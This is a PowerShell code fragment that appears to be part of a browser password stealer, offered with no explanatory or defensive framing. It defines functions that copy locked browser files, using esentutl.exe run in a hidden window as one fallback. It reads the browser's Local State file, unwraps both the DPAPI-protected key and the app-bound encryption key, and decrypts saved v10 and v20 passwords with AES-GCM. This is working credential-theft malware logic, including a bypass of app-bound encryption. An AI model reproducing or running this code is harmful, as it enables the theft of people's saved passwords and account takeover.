function Grab($src, $dest) {
  try {
    $fs = [IO.File]::Open($src, "Open", "Read", "ReadWrite")
    $out = [IO.File]::Create($dest)
    $fs.CopyTo($out); $out.Close(); $fs.Close()
    return $true
  } catch { }
  try { Copy-Item -LiteralPath $src -Destination $dest -Force -ErrorAction Stop; if (Test-Path $dest) { return $true } } catch { }
  try {
    $p = Start-Process -FilePath "esentutl.exe" -ArgumentList @("/y", ('"' + $src + '"'), "/d", ('"' + $dest + '"'), "/o") -PassThru -WindowStyle Hidden
    $p.WaitForExit(9000) | Out-Null
    if (Test-Path $dest) { return $true }
  } catch { }
  return $false
}

function Read-Key([string]$statePath) {
  if (-not (Test-Path $statePath)) { return @{ k = $null; abe = $null } }
  try { $j = Get-Content -Raw -Path $statePath | ConvertFrom-Json } catch { return @{ k = $null; abe = $null } }
  $out = @{ k = $null; abe = $null }
  $enc = $j.os_crypt.encrypted_key
  if ($enc) {
    $b = [Convert]::FromBase64String($enc)
    if ($b.Length -gt 5) { $out.k = [Crypt]::Dpapi($b[5..($b.Length - 1)]) }
  }
  $abe = $j.os_crypt.app_bound_encrypted_key
  if ($abe) {
    $b2 = [Convert]::FromBase64String($abe)
    if ($b2.Length -gt 4) { $out.abe = [Crypt]::Abe($b2[4..($b2.Length - 1)], [Guid]"708860E0-F641-4611-8895-7D867DD3675B") }
  }
  return $out
}

function Decrypt-Pw($hex, $keys) {
  if (-not $hex) { return $null }
  $b = New-Object byte[] ($hex.Length / 2)
  for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16) }
  $tag = "v10"

  if ($b.Length -gt 15 -and [Text.Encoding]::ASCII.GetString($b, 0, 3) -eq "v10") {
    if (-not $keys.k) { return $null }
    return [Text.Encoding]::UTF8.GetString([Crypt]::Gcm($keys.k, $b[3..14], $b[15..($b.Length - 17)], $b[($b.Length - 16)..($b.Length - 1)]))
  }
  if ($b.Length -gt 15 -and [Text.Encoding]::ASCII.GetString($b, 0, 3) -eq "v20") {
    if (-not $keys.abe) { return $null }
    return [Text.Encoding]::UTF8.GetString([Crypt]::Gcm($keys.abe, $b[3..14], $b[15..($b.Length - 17)], $b[($b.Length - 16)..($b.Length - 1)]))
  }
  if ($b.Length -gt 5) {
    $r = [Crypt]::Dpapi($b)
    if ($r) { return [Text.Encoding]::UTF8.GetString($r) }
  }
  return $null
}
